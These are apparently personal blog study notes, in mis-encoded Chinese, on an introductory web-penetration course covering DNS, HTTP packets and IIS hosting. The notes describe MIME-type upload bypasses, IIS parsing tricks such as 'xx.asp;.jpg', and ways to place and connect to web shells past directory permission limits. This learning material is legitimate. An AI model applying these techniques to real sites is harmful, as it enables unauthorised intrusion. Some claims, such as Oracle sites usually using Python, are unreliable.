    <title>å°è¿ªwebè§†é¢‘å­¦ä¹ è®°å½•</title>
    <url>/2022/07/21/xiaodi/</url>
    <content><![CDATA[<p><u><code>çœ‹çœ‹å°è¿ªå¸ˆå‚…çš„è§†é¢‘ï¼ŒæŠŠä¸€äº›çŸ¥è¯†ç‚¹è¡¥å……ä»¥åŠæ·±å…¥å­¦ä¹ ä¸€ä¸‹ï¼Œåšåšç¬”è®°</code></u></p>
<span id="more"></span>

<hr>
<p><code>æ—¶é—´ä¸æ˜¯æŒ‰å°è¿ªå¸ˆå‚…è§†é¢‘æ¥çš„ï¼Œæ˜¯çœ‹æˆ‘å½“å¤©çš„æ—¶é—´ï¼Œå°½é‡æ¯å¤©èƒ½çœ‹ä¸ªä¸€ä¸¤ä¸ªå§</code></p>
<h2 id="DAY1-åŸºç¡€å…¥é—¨-æ¦‚å¿µåè¯"><a href="#DAY1-åŸºç¡€å…¥é—¨-æ¦‚å¿µåè¯" class="headerlink" title="DAY1 åŸºç¡€å…¥é—¨-æ¦‚å¿µåè¯"></a>DAY1 åŸºç¡€å…¥é—¨-æ¦‚å¿µåè¯</h2><p><img src="/2022/07/21/xiaodi/image-20220725210618077.png" alt="image-20220725210618077"></p>
<p><strong>1.DNS</strong>ï¼šä¸€èˆ¬æŒ‡åŸŸåç³»ç»Ÿï¼Œå¯ä»¥å°†IPå’ŒåŸŸåç›¸äº’è½¬åŒ–ï¼Œæ¯”å¦‚è®¿é—®baidu.comï¼ŒDNSå°±ä¼šæŸ¥å‡ºå®ƒçš„IPä¾‹å¦‚120.0.0.1ï¼Œè¿›è¡Œè®¿é—®ï¼Œä»è€Œäººä»¬ä¸ç”¨è¾“å…¥å¤æ‚çš„IP</p>
<p>æˆ‘ä»¬æœ‰æ—¶<u>æ‰“å¼€ä¸€äº›ç½‘ç«™æˆ–è€…ä¸‹è½½ä¸œè¥¿æ—¶å¡é¡¿</u>ï¼Œæˆ‘ä»¬ç™¾åº¦å¾€å¾€ä¼šå¾—åˆ°ä¸€ä¸ªæ–¹æ³•ä¿®æ”¹<strong>hosts</strong>æ–‡ä»¶</p>
<p><strong>hosts</strong>æ–‡ä»¶è´Ÿè´£è§£æåŸŸåå¹¶ä¼˜å…ˆäºDNSæœåŠ¡ï¼Œé€šå¸¸å¾ˆå¤šæ¶æ„è½¯ä»¶ä¼šæ¶æ„æ›´æ”¹è¯¥æ–‡ä»¶æ¥è¾¾åˆ°åŠ«æŒç½‘ç«™çš„ç›®åœ°ï¼Œä¹Ÿå°±æ˜¯DNSæ”»å‡»</p>
<p>æ¯”å¦‚ä¸‹å›¾ï¼Œå½“åœ¨<strong>hosts</strong>æ–‡ä»¶é‡ŒåŠ ä¸Šæ—¶ï¼Œå½“æˆ‘ä»¬åœ¨æµè§ˆå™¨è®¿é—®<code>www.baidu.com</code>çš„æ—¶å€™å°±ä¼šè®¿é—®<strong>IP:14.215.177.38</strong>ï¼Œè€Œè¿™ä¸ª<strong>IP</strong>å¯èƒ½æ˜¯ç™¾åº¦çš„ç½‘ç«™ï¼Œä¹Ÿå¯èƒ½æ˜¯é’“é±¼ç½‘ç«™çš„IPï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å…‰çœ‹æµè§ˆå™¨ç½‘ç«™åŸŸåå°±æ ¹æœ¬åˆ†ä¸æ¸…æ¥šï¼ˆå¦‚æœé’“é±¼ç½‘ç«™é¡µé¢å’Œæˆ‘ä»¬çš„ç›®æ ‡ç½‘ç«™ç•Œé¢ä¸€è‡´ï¼‰</p>
<p><img src="/2022/07/21/xiaodi/image-20220721145608355.png" alt="image-20220721145608355"></p>
<hr>
<h2 id="DAY2-åŸºç¡€å…¥é—¨-æ•°æ®åŒ…æ‹“å±•"><a href="#DAY2-åŸºç¡€å…¥é—¨-æ•°æ®åŒ…æ‹“å±•" class="headerlink" title="DAY2 åŸºç¡€å…¥é—¨-æ•°æ®åŒ…æ‹“å±•"></a>DAY2 åŸºç¡€å…¥é—¨-æ•°æ®åŒ…æ‹“å±•</h2><h3 id="1-proxy"><a href="#1-proxy" class="headerlink" title="1.proxy"></a>1.proxy</h3><p>ä¸‹é¢è¿™å¼ å›¾å¾ˆå¥½çš„è§£é‡Šäº†<strong>proxy</strong>çš„ä½œç”¨ï¼Œå®ƒæ˜¯æµè§ˆå™¨å’ŒæœåŠ¡å™¨ä¹‹é—´çš„ï¼Œæ˜¯ä¸¤è€…æ•°æ®äº¤äº’çš„ä¸­é—´æ¡¥æ¢ï¼Œåˆ©ç”¨<strong>proxy</strong>å°±å¯ä»¥å®ç°ä¿®æ”¹æµè§ˆå™¨å‘é€çš„è¯·æ±‚å’ŒæœåŠ¡å™¨å‘å›çš„æ•°æ®åŒ…ï¼Œæˆ–è€…æ‹¦æˆªè·å–</p>
<p><img src="/2022/07/21/xiaodi/image-20220721144031544.png" alt="image-20220721144031544"></p>
<h3 id="2-httpå’Œhttps"><a href="#2-httpå’Œhttps" class="headerlink" title="2.httpå’Œhttps"></a>2.httpå’Œhttps</h3><p><strong>https</strong>ç›¸å¯¹<strong>http</strong>æ›´å®‰å…¨çš„åŸå› åœ¨äº<strong>SSL or TLS</strong>çš„å­˜åœ¨ï¼Œå®ƒä¸åœ¨åƒ<strong>http</strong>ä¸€æ ·æŠŠä¿¡æ¯ä»¥æ˜æ–‡çš„å½¢å¼å‘ˆç°å‡ºæ¥ï¼Œæ¯”å¦‚åˆ©ç”¨<strong>burp</strong>æŠ“åŒ…ï¼Œhttpçš„ä¿¡æ¯ï¼ˆæ¯”å¦‚è´¦å·å¯†ç ï¼‰å°±ä¼šæ˜¾ç°å‡ºæ¥ï¼Œè€Œ<strong>SSL or TLS</strong>ä¼šå¯¹å…¶ä¿¡æ¯è¿›è¡ŒåŠ å¯†<strong>ï¼ˆéœ€è¦ç§é’¥æ‰è§£çš„å¼€ï¼‰</strong>ï¼Œé‚£å°±ç®—è¢«æŠ“åŒ…ï¼Œä¹Ÿåªèƒ½å¾—åˆ°ä¸€ä¸²åŠ å¯†æ•°æ®</p>
<p><u>è¿™é‡Œæ¨èå¯ä»¥ä¹°æœ¬<strong>ã€Šå›¾è§£httpã€‹</strong>çœ‹çœ‹</u></p>
<p><img src="/2022/07/21/xiaodi/image-20220721144040328.png" alt="image-20220721144040328"></p>
<p> ä¸‹é¢æ˜¯httpç®€è¦é€šè®¯æµç¨‹</p>
<p><img src="/2022/07/21/xiaodi/1.png" alt="image-20220721150847367"></p>
<p>ä¸‹é¢å°±æ˜¯httpsçš„å“åº”æµç¨‹</p>
<p><img src="/2022/07/21/xiaodi/image-20220721150429225.png" alt="image-20220721150429225"></p>
<h3 id="3-Requestè¯·æ±‚æ•°æ®åŒ…"><a href="#3-Requestè¯·æ±‚æ•°æ®åŒ…" class="headerlink" title="3.Requestè¯·æ±‚æ•°æ®åŒ…"></a>3.Requestè¯·æ±‚æ•°æ®åŒ…</h3><p><img src="/2022/07/21/xiaodi/image-20220723220144117.png" alt="image-20220723220144117"></p>
<h4 id="1-è¯·æ±‚è¡Œ"><a href="#1-è¯·æ±‚è¡Œ" class="headerlink" title="1.è¯·æ±‚è¡Œ"></a>1.è¯·æ±‚è¡Œ</h4><p>å¦‚ä¸‹ä¾‹ï¼Œ</p>
<p>è¯·æ±‚æ–¹æ³•ï¼šGET   ||  è¯·æ±‚urlï¼šindex.html  ||   HTTPç‰ˆæœ¬ï¼š1.1</p>
<p><img src="/2022/07/21/xiaodi/image-20220723220333853.png" alt="image-20220723220333853"></p>
<p><img src="/2022/07/21/xiaodi/image-20220723221340261.png" alt="image-20220723221340261"></p>
<h4 id="2-è¯·æ±‚å¤´"><a href="#2-è¯·æ±‚å¤´" class="headerlink" title="2.è¯·æ±‚å¤´"></a>2.è¯·æ±‚å¤´</h4><p><img src="/2022/07/21/xiaodi/image-20220724172547877.png" alt="image-20220724172547877"></p>
<p>1ï¼‰MIMEæ–‡ä»¶æ ¼å¼å¯ä»¥ä¿®æ”¹ç»•è¿‡MIMEéªŒè¯ï¼Œåœ¨æ–‡ä»¶ä¸Šä¼ çš„æ—¶å€™ï¼Œå°±å¯ä»¥ä¿®æ”¹MIMEç±»å‹æ¥ç»•è¿‡å‰ç«¯éªŒè¯</p>
<p>æ¯”å¦‚éœ€è¦å›¾ç‰‡æ ¼å¼ï¼Œä½†è®¾æœ‰MIMEéªŒè¯ï¼Œè€Œä¸Šä¼ phpæˆ–å…¶ä»–æ–‡ä»¶æ—¶ï¼Œ</p>
<p>Acceptä¸ºapplication/octet-stream   ä¸ºäº†ä¸Šä¼ æˆåŠŸå°±éœ€è¦ä¿®æ”¹å…¶ä¸ºimage/pngï¼Œä»è€Œç»•è¿‡MIMEéªŒè¯</p>
<p><img src="/2022/07/21/xiaodi/image-20220724173613276.png" alt="image-20220724173613276"></p>
<p>Refererä»£è¡¨äº§ç”Ÿè¯·æ±‚çš„ç½‘é¡µï¼Œå¦‚æœæ˜¯åœ¨è¯¥ç½‘ç«™è®¿é—®è¯¥ç½‘ç«™çš„é“¾æ¥ï¼Œé‚£refererå¯èƒ½ä¸ºç©ºï¼Œå¦‚æœæ˜¯ä»å…¶ä»–ç½‘ç«™è¯·æ±‚è®¿é—®ï¼Œå°±ä¼šåœ¨refererå¤„æ˜¾ç¤ºç½‘ç«™url</p>
<p>ä¸€äº›ç½‘ç«™å¯èƒ½ä¼šéªŒè¯refereråˆ¤æ–­æ˜¯å¦å¯èƒ½æ˜¯ä»å…¶ä»–ç½‘ç«™æ¥çš„ï¼Œä¿æŠ¤ç”¨æˆ·è´¦å·å®‰å…¨ï¼Œé¿å…ç”¨æˆ·cookieè¢«ç›—ç”¨ï¼Œä¹Ÿå°±æ˜¯csrfæ¼æ´</p>
<p><img src="/2022/07/21/xiaodi/image-20220724175117961.png" alt="image-20220724175117961"></p>
<h4 id="3-ç©ºè¡Œå’Œè¯·æ±‚ä½“"><a href="#3-ç©ºè¡Œå’Œè¯·æ±‚ä½“" class="headerlink" title="3.ç©ºè¡Œå’Œè¯·æ±‚ä½“"></a>3.ç©ºè¡Œå’Œè¯·æ±‚ä½“</h4><p><img src="/2022/07/21/xiaodi/image-20220724211529241.png" alt="image-20220724211529241"></p>
<p>ç©ºè¡Œå’Œè¯·æ±‚ä½“å¯ä»¥çœ‹çœ‹ä¸‹é¢è¿™ä¸ªä¾‹å­</p>
<p><img src="/2022/07/21/xiaodi/image-20220724203919573.png" alt="image-20220724203919573"></p>
<p>å¯ä»¥çœ‹åˆ°è¯·æ±‚ä½“æ˜¯<code>id=1&amp;submit=%E6%9F%A5%E8%AF%A2</code>è€Œå…¶ä¸Šé¢å°±æ˜¯å’Œè¯·æ±‚å¤´åˆ†å¼€çš„ç©ºè¡Œ</p>
<p><img src="/2022/07/21/xiaodi/image-20220724203945852.png" alt="image-20220724203945852"></p>
<h3 id="4-responseè¿”å›æ•°æ®åŒ…"><a href="#4-responseè¿”å›æ•°æ®åŒ…" class="headerlink" title="4.responseè¿”å›æ•°æ®åŒ…"></a>4.responseè¿”å›æ•°æ®åŒ…</h3><p><img src="/2022/07/21/xiaodi/image-20220724213601900.png" alt="image-20220724213601900"></p>
<p><u><strong>HTTPå“åº”ç ï¼ˆçŠ¶æ€ç ï¼‰</strong></u></p>
<p><img src="/2022/07/21/xiaodi/image-20220723215355113.png" alt="image-20220723215355113"></p>
<h4 id="1-çŠ¶æ€è¡Œ"><a href="#1-çŠ¶æ€è¡Œ" class="headerlink" title="1.çŠ¶æ€è¡Œ"></a>1.çŠ¶æ€è¡Œ</h4><p>ä¸‹ä¾‹<strong>çŠ¶æ€ä»£ç </strong>ï¼š200  || <strong>åè®®ç‰ˆæœ¬</strong>ï¼šHTTP/1.1 ||   <strong>çŠ¶æ€æè¿°</strong>ï¼šOK</p>
<p><img src="/2022/07/21/xiaodi/image-20220724222056594.png" alt="image-20220724222056594"></p>
<h4 id="2-å“åº”å¤´æ ‡"><a href="#2-å“åº”å¤´æ ‡" class="headerlink" title="2.å“åº”å¤´æ ‡"></a>2.å“åº”å¤´æ ‡</h4><p>ä¸Šå›¾é™¤äº†ç¬¬ä¸€è¡Œä»¥å¤–å°±æ˜¯å“åº”å¤´æ ‡ï¼Œç±»ä¼¼è¯·æ±‚å¤´</p>
<h4 id="3-ç©ºè¡Œ"><a href="#3-ç©ºè¡Œ" class="headerlink" title="3.ç©ºè¡Œ"></a>3.ç©ºè¡Œ</h4><p>åœ¨å“åº”å¤´æ ‡å’Œå“åº”æ•°æ®ä¹‹é—´ï¼Œè¡¨ç¤ºå“åº”å¤´æ ‡çš„ç»“æŸ</p>
<h4 id="4-å“åº”æ•°æ®"><a href="#4-å“åº”æ•°æ®" class="headerlink" title="4.å“åº”æ•°æ®"></a>4.å“åº”æ•°æ®</h4><p><strong>å“åº”æ•°æ®</strong>å°±æ˜¯å½“å‰é¡µé¢çš„æºä»£ç </p>
<p><img src="/2022/07/21/xiaodi/image-20220724222442836.png" alt="image-20220724222442836"></p>
<hr>
<h2 id="DAY3-åŸºç¡€å…¥é—¨-æ­å»ºå®‰å…¨æ‹“å±•"><a href="#DAY3-åŸºç¡€å…¥é—¨-æ­å»ºå®‰å…¨æ‹“å±•" class="headerlink" title="DAY3 åŸºç¡€å…¥é—¨-æ­å»ºå®‰å…¨æ‹“å±•"></a>DAY3 åŸºç¡€å…¥é—¨-æ­å»ºå®‰å…¨æ‹“å±•</h2><h3 id="1-å¸¸è§æ­å»ºå¹³å°è„šæœ¬å¯ç”¨"><a href="#1-å¸¸è§æ­å»ºå¹³å°è„šæœ¬å¯ç”¨" class="headerlink" title="1.å¸¸è§æ­å»ºå¹³å°è„šæœ¬å¯ç”¨"></a>1.å¸¸è§æ­å»ºå¹³å°è„šæœ¬å¯ç”¨</h3><p><img src="/2022/07/21/xiaodi/image-20220725230825776.png" alt="image-20220725230825776"></p>
<h3 id="2-åŸŸåIPç›®å½•è§£æå®‰å…¨é—®é¢˜"><a href="#2-åŸŸåIPç›®å½•è§£æå®‰å…¨é—®é¢˜" class="headerlink" title="2.åŸŸåIPç›®å½•è§£æå®‰å…¨é—®é¢˜"></a>2.åŸŸåIPç›®å½•è§£æå®‰å…¨é—®é¢˜</h3><p><strong>åŸŸåè®¿é—®</strong>æ—¶ï¼ˆå¦‚<code>www.baidu.com</code>ï¼‰ä¸€èˆ¬æ˜¯<strong>æŒ‡å‘æŸä¸ªç‰¹å®šæ–‡ä»¶</strong>ï¼Œç”¨å·¥å…·æ‰«ææ—¶ï¼Œä¹Ÿåªèƒ½æ‰«æè¯¥ç›®å½•ä¸‹çš„æ–‡ä»¶</p>
<p><strong>IPè®¿é—®</strong>æ—¶å°±å¯ä»¥<strong>è®¿é—®åˆ°æ ¹ç›®å½•</strong>ï¼Œæ‰«ææ—¶å°±å¯èƒ½æ‰«æåˆ°è¯¥ç«™ç‚¹ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ï¼Œç”šè‡³è¿˜æœ‰ç½‘ç«™æºç å¤‡ä»½æ–‡ä»¶</p>
<p><u>ä¸€èˆ¬æ˜¯IPå’ŒåŸŸååŒæ—¶ä½¿ç”¨</u></p>
<h3 id="3-å¸¸è§æ–‡ä»¶åç¼€è§£æå¯¹åº”å®‰å…¨"><a href="#3-å¸¸è§æ–‡ä»¶åç¼€è§£æå¯¹åº”å®‰å…¨" class="headerlink" title="3.å¸¸è§æ–‡ä»¶åç¼€è§£æå¯¹åº”å®‰å…¨"></a>3.å¸¸è§æ–‡ä»¶åç¼€è§£æå¯¹åº”å®‰å…¨</h3><p><img src="/2022/07/21/xiaodi/image-20220725210703706.png" alt="image-20220725210703706"></p>
<p>ä¸‹å›¾æ˜¯ï¼Œiisä¸­é—´ä»¶</p>
<p>æ‰©å±•åå¯¹åº”é…ç½®æ–‡ä»¶ï¼Œä½¿å¾—æœ‰è¯¥æ‰©å±•åçš„æ–‡ä»¶ä»¥é…ç½®æ–‡ä»¶å®šä¹‰çš„æ–¹å¼æ‰“å¼€æˆ–è¿è¡Œ</p>
<p>å¦‚ï¼Œæ·»åŠ ä¸€ä¸ªæ‰©å±•åä¸º.hahaï¼Œå¯¹åº”çš„é…ç½®æ–‡ä»¶å°±ä¸ºä¸‹å›¾çš„.aspæ‰©å±•åå¯¹åº”çš„é…ç½®æ–‡ä»¶ï¼Œè¿™æ ·æ‰“å¼€.hahaæ‰©å±•åçš„æ–‡ä»¶å°±ç›¸å½“äºæ‰“å¼€.aspç±»å‹çš„æ–‡ä»¶äº†</p>
<p>æ‰€ä»¥ï¼Œåˆ©ç”¨è¿™ä¸ªæœ‰æ—¶å€™æˆ‘ä»¬ä¸Šä¼ ä»¥ä¸ºæ­£ç¡®çš„æ–‡ä»¶æ‰©å±•åï¼Œä½†å´æ— æ³•ä»¥æˆ‘ä»¬æƒ³è¦çš„æ–¹å¼æ‰“å¼€æˆ–è€…ç”¨èšå‰‘ã€èœåˆ€ç­‰å·¥å…·è¿æ¥ï¼Œå°±å¯èƒ½æ˜¯ä¸­é—´ä»¶è§£æåè®®ä¿®æ”¹äº†æœ¬æ¥çš„æ‰©å±•å</p>
<p>å¦‚åˆ é™¤äº†.aspï¼Œåªä¿ç•™.hahaæ‰©å±•åï¼Œå¦‚æœä¸Šä¼ .aspæ‰©å±•åæ–‡ä»¶ï¼Œå°±ä¼šæ— æ•ˆï¼Œä½¿å¾—æˆ‘ä»¬å—é˜»ï¼Œåªæœ‰ä¸Šä¼ .hahaæ‰©å±•åæ–‡ä»¶æ‰å¯ä»¥è¢«è§†ä¸ºaspæ–‡ä»¶</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">è¿™é‡Œåšä¸ªè¡¥å……ï¼Œï¼Œä¹‹å‰åšè¿‡ä¸€ä¸ªâ€œå†…éƒ¨æ–‡ä»¶ä¸Šä¼ ç³»ç»Ÿæ¼æ´åˆ†ææº¯æºâ€çš„é¢˜ï¼Œæåˆ°äº†iisä½ç‰ˆæœ¬è§£ææ¼æ´</span><br><span class="line"></span><br><span class="line">IISè§£ææ¼æ´åˆ†ä¸ºä¸¤ç§ï¼š</span><br><span class="line">ï¼ˆ1ï¼‰ä¸€ç§æ˜¯åœ¨ä»¥â€œ<span class="string">.asp</span>â€â€œ<span class="string">.asa</span>â€å‘½åçš„æ–‡ä»¶å¤¹å†…ï¼Œæ‰€æœ‰æ–‡ä»¶éƒ½ä»¥aspæ–‡ä»¶è¢«è§£æã€‚</span><br><span class="line">ï¼ˆ2ï¼‰ç¬¬äºŒç§æ˜¯IISçš„æ–‡ä»¶è§£æ,å½¢å¼ï¼š<span class="string">/xx.asp</span>;<span class="string">.jpg</span>ï¼ˆåˆ©â½¤ç‰¹æ®Šç¬¦å· <span class="string">&quot;;&quot;</span><span class="string">.xx.asp</span>;<span class="string">.jpg</span> è¢«è§£æä¸ºaspè„šæœ¬</span><br></pre></td></tr></table></figure>

<p><img src="/2022/07/21/xiaodi/image-20220725223658222.png" alt="image-20220725223658222"></p>
<h3 id="4-å¸¸è§å®‰å…¨æµ‹è¯•ä¸­çš„å®‰å…¨é˜²æŠ¤"><a href="#4-å¸¸è§å®‰å…¨æµ‹è¯•ä¸­çš„å®‰å…¨é˜²æŠ¤" class="headerlink" title="4.å¸¸è§å®‰å…¨æµ‹è¯•ä¸­çš„å®‰å…¨é˜²æŠ¤"></a>4.å¸¸è§å®‰å…¨æµ‹è¯•ä¸­çš„å®‰å…¨é˜²æŠ¤</h3><h4 id="1-æ‹’ç»åŒ¿åè®¿é—®"><a href="#1-æ‹’ç»åŒ¿åè®¿é—®" class="headerlink" title="1.æ‹’ç»åŒ¿åè®¿é—®"></a>1.æ‹’ç»åŒ¿åè®¿é—®</h4><p>è¿™æ ·æƒ³è¦è®¿é—®ç½‘ç«™é¡µé¢çš„æ—¶å€™ï¼Œå°±éœ€è¦è¾“å…¥é™å®šè´¦å·å’Œå¯†ç ï¼Œå¦åˆ™å°±æ— æ³•è¿›è¡Œè®¿é—®</p>
<h4 id="2-æ‹’ç»ä¸€å°ç”µè„‘æˆ–ä¸€ç»„ç”µè„‘çš„IPæˆ–åŸŸåé™åˆ¶ï¼ˆä¹Ÿæ˜¯IPåœ°å€é™åˆ¶ï¼‰"><a href="#2-æ‹’ç»ä¸€å°ç”µè„‘æˆ–ä¸€ç»„ç”µè„‘çš„IPæˆ–åŸŸåé™åˆ¶ï¼ˆä¹Ÿæ˜¯IPåœ°å€é™åˆ¶ï¼‰" class="headerlink" title="2.æ‹’ç»ä¸€å°ç”µè„‘æˆ–ä¸€ç»„ç”µè„‘çš„IPæˆ–åŸŸåé™åˆ¶ï¼ˆä¹Ÿæ˜¯IPåœ°å€é™åˆ¶ï¼‰"></a>2.æ‹’ç»ä¸€å°ç”µè„‘æˆ–ä¸€ç»„ç”µè„‘çš„IPæˆ–åŸŸåé™åˆ¶ï¼ˆä¹Ÿæ˜¯IPåœ°å€é™åˆ¶ï¼‰</h4><p>é€šè¿‡æ·»åŠ å¯¹æ–¹IPï¼Œæ¥å®ç°åœ¨IPå†…çš„æ‰€æœ‰è®¡ç®—æœºç½‘ç»œéƒ½æ— æ³•è®¿é—®è¯¥ç½‘ç«™</p>
<h3 id="5-WEBåé—¨ä¸ç”¨æˆ·åŠæ–‡ä»¶æƒé™"><a href="#5-WEBåé—¨ä¸ç”¨æˆ·åŠæ–‡ä»¶æƒé™" class="headerlink" title="5.WEBåé—¨ä¸ç”¨æˆ·åŠæ–‡ä»¶æƒé™"></a>5.WEBåé—¨ä¸ç”¨æˆ·åŠæ–‡ä»¶æƒé™</h3><p>åˆ©ç”¨èœåˆ€ç­‰å·¥å…·ï¼Œå¯ä»¥è¿æ¥åˆ°æœåŠ¡å™¨ä¸­çš„åé—¨ï¼Œä½†æ˜¯å¦‚æœæœåŠ¡å™¨ç«¯è®¾ç½®äº†å¯¹Internet æ¥å®¾ç”¨æˆ·çš„æƒé™æ—¶ï¼Œå°±ä¼šé‡åˆ°é˜»ç¢</p>
<p>å¦‚è®¾ç½®æ‹’ç»è¯»å–ï¼Œé‚£ä¹ˆèœåˆ€å°±æ— æ³•è¯»å–è¯¥æ–‡ä»¶å¤¹ä¸‹çš„å†…å®¹ï¼Œå°±åœ¨å‰é¢æåˆ°ç½‘ç«™çš„æ‹’ç»åŒ¿åè®¿é—®</p>
<p>å¦‚æœè®¾ç½®æ‹’ç»å†™å…¥ï¼Œé‚£ä¹ˆèœåˆ€å°±æ— æ³•åœ¨å…¶ä¸­æ–°å»ºæ–‡ä»¶</p>
<p>ä½†æ˜¯è¯¥ç½‘ç«™è¿™ä¸ªç›®å½•ä¸‹çš„ç½‘ç«™é¡µé¢ï¼Œä¹Ÿæ— æ³•æ­£å¸¸è®¿é—®</p>
<p><img src="/2022/07/21/xiaodi/image-20220726110555183.png" alt="image-20220726110555183"></p>
<p>ä¸‹å›¾ä¸ºç½‘ç«™ä¸ç»™æ‰§è¡Œæƒé™ï¼Œä¹Ÿå°±æ˜¯é‡Œé¢çš„æ–‡ä»¶éƒ½æ— æ³•æ‰§è¡Œï¼Œè¿™æ ·æ— è®ºæ˜¯è®¿é—®æˆ‘ä»¬ä¸Šä¼ çš„æœ¨é©¬ï¼Œè¿˜æ˜¯èœåˆ€è¯•ç€è¿æ¥æœ¨é©¬ï¼Œéƒ½ä¸è¡Œï¼Œä»¥å› ä¸ºæ²¡æœ‰äº†æ‰§è¡Œæƒé™ï¼Œé‚£ä¹ˆæˆ‘ä»¬å†™çš„ä¸€å¥è¯æœ¨é©¬çš„ä»£ç ä¹Ÿå‘æŒ¥ä¸äº†ä½œç”¨</p>
<p>è¿™ä¹Ÿæ˜¯å®æˆ˜ä¸­ä¸ºä»€ä¹ˆä¼šè¿™ä¹ˆå›°éš¾å’Œå¤æ‚</p>
<p><u><strong>é‚£ä¹ˆä¸€èˆ¬å¦‚ä½•è§£å†³è¿™ä¸ªé—®é¢˜å‘¢ï¼Ÿ</strong></u></p>
<p>æˆ‘ä»¬å¯ä»¥è¯•è¯•æ¢ä¸€ä¸ªç›®å½•ï¼Œä¸€èˆ¬è¿™ç§é™åˆ¶æœ€å¯èƒ½åœ¨ä¾‹å¦‚uploadè¿™ç§ç›®å½•ï¼Œä½†æ˜¯imgè¿™ç±»å›¾ç‰‡ç›®å½•ä¸‹ï¼Œå¸¸ç†è€Œè¨€æ˜¯æ²¡æœ‰è„šæœ¬æ–‡ä»¶ï¼Œæ‰€ä»¥å¾ˆæœ‰å¯èƒ½æ˜¯æ²¡æœ‰åŠ ä»¥é™åˆ¶çš„ï¼Œæ‰€ä»¥åœ¨ä¸Šä¼ æ–‡ä»¶çš„æ—¶å€™ï¼Œå¯ä»¥è¯•è¯•æŠ“åŒ…ç„¶åä¿®æ”¹æ–‡ä»¶ä¸Šä¼ çš„ç›®å½•ï¼Œä»è€Œä½¿å¾—è„šæœ¬å¯ä»¥æ­£å¸¸æ‰§è¡Œå’Œä¸å·¥å…·è¿æ¥</p>
<p>ä¸€èˆ¬æ€è·¯å°±æ˜¯æŠŠè„šæœ¬æ–‡ä»¶åŠªåŠ›ä¸Šä¼ åˆ°æœ€å¯èƒ½æ²¡æœ‰é™åˆ¶çš„ç›®å½•ä¸‹ï¼Œæ¯”å¦‚<u>æ ¹ç›®å½•</u>ï¼Œæˆ–è€…<u>ç½‘ç«™è‡ªèº«çš„è„šæœ¬ç›®å½•</u>ï¼ˆå› ä¸ºå®ƒè‡ªèº«å¯èƒ½ä¹Ÿéœ€è¦è¿è¡Œå®ƒè‡ªå·±çš„è„šæœ¬ï¼Œæ‰€ä»¥å¤§æ¦‚ç‡ä¸å¯èƒ½åœ¨é‚£ä¸ªç›®å½•ä¸‹åŠ ä¸Šæƒé™ï¼Œè¿™æ ·å®ƒè‡ªå·±ä¹Ÿæ— æ³•æ­£å¸¸è¿è¡Œäº†ï¼‰</p>
<p><img src="/2022/07/21/xiaodi/image-20220726110523557.png" alt="image-20220726110523557"></p>
<h3 id="6-ç½‘ç«™æºç è„šæœ¬æ ¼å¼"><a href="#6-ç½‘ç«™æºç è„šæœ¬æ ¼å¼" class="headerlink" title="6.ç½‘ç«™æºç è„šæœ¬æ ¼å¼"></a>6.ç½‘ç«™æºç è„šæœ¬æ ¼å¼</h3><p><code>ä¸€èˆ¬å¯ä»¥æ ¹æ®æ•°æ®åº“ç±»å‹ï¼Œæˆ–è€…ç½‘ç«™æ­å»ºçš„ä¸­é—´ä»¶å¹³å°åŠ ä»¥æ¨å¯¼</code></p>
<h4 id="1-çŸ¥é“æ•°æ®åº“ç±»å‹"><a href="#1-çŸ¥é“æ•°æ®åº“ç±»å‹" class="headerlink" title="1.çŸ¥é“æ•°æ®åº“ç±»å‹"></a>1.çŸ¥é“æ•°æ®åº“ç±»å‹</h4><p>mysqlæ•°æ®åº“ä¸€èˆ¬æ˜¯phpè„šæœ¬</p>
<p>sqlserveræ•°æ®åº“ä¸€èˆ¬æ˜¯aspæˆ–aspxè„šæœ¬</p>
<p>oracleæ•°æ®åº“ä¸€èˆ¬æ˜¯pythonè„šæœ¬</p>
<h4 id="2-çŸ¥é“ä¸­é—´ä»¶"><a href="#2-çŸ¥é“ä¸­é—´ä»¶" class="headerlink" title="2.çŸ¥é“ä¸­é—´ä»¶"></a>2.çŸ¥é“ä¸­é—´ä»¶</h4><p>iisä¸€èˆ¬ç”¨aspæˆ–aspx</p>
<p>apacheä¸€èˆ¬phpè„šæœ¬å±…å¤š</p>
<p>tomcatä¸€èˆ¬jspè„šæœ¬</p>
<p>å¦‚æœåˆ¤æ–­ä¸å‡ºç½‘ç«™çš„æºç è„šæœ¬æ–‡ä»¶ï¼Œ</p>
<p>å¯èƒ½ç½‘ç«™åšäº†ä¼ªé™æ€ï¼Œé‚£ä¹ˆåœ¨è„šæœ¬ç±»å‹ä¸ä¼šåœ¨ç½‘ç«™åœ°å€ä¸‹å»ä½“ç°ï¼Œä½†æ˜¯ç”¨<u><strong>æ‰«æå·¥å…·</strong></u>å¯ä»¥æ›´åŠ æ·±å…¥çš„çˆ¬å¯»æ–‡ä»¶</p>
<p>è¿˜æœ‰ä¸€ä¸ªæ–¹æ³•å°±æ˜¯åœ¨<u><strong>è°·æ­Œæœç´¢å¼•æ“</strong></u>ä¸Šçœ‹çœ‹æœ‰æ²¡æœ‰è¯¥ç½‘ç«™çš„å¿«ç…§ä¿¡æ¯ï¼Œæœ‰å¿«ç…§ä¿¡æ¯å°±å¯ä»¥é’ˆå¯¹æ€§çš„ç”¨å…³é”®è¯ç­›é€‰ä¸€ä¸‹ï¼Œçœ‹æœ‰æ²¡æœ‰è„šæœ¬è¿è¡Œä¿¡æ¯å‡ºç°</p>
<p>è¿˜æœ‰å°±æ˜¯å¯ä»¥<u><strong>æŠ“ç½‘ç«™çš„æ•°æ®åŒ…</strong></u>ï¼Œçœ‹çœ‹æ•°æ®åŒ…é‡Œï¼Œä¸€èˆ¬çš„å¦‚æœæ•°æ®åŒ…çš„å†™æ³•ä¸åŒï¼Œé‡Œé¢çš„cookieå€¼å°±ä¼šæœ‰æ‰€ä¸åŒï¼Œæ¯”å¦‚phpsession,jspsessionï¼Œå°±å¯ä»¥æ ¹æ®å‰ç¼€çŸ¥é“æ˜¯ä»€ä¹ˆç±»å‹çš„è„šæœ¬æ–‡ä»¶ ï¼Œå¦‚æœéƒ½ä¸æ˜¯å¯èƒ½å°±æ˜¯aspæˆ–aspx</p>
<hr>
